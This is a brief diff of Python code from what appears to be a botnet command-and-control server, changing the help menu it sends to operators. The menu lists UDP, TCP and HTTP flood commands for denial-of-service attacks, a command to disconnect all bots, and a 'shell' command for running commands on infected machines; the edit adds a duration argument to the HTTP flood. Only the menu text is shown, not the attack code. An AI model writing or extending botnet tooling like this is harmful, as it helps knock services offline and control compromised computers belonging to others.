@@ -97,7 +97,7 @@ def clientThread(conn):
 					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
 					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
 					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
-					conn.sendall("[?] >http [Target(without http://)] [Threads] - HTTP DDoS Attack\r\n")
+					conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
 					conn.sendall("[?] >killbots - Disconnects all bots\r\n")
 					conn.sendall("[?] >shell - Allows the host to use commands from the bots terminal\r\n")
 					if rank.startswith(rankAdmin):
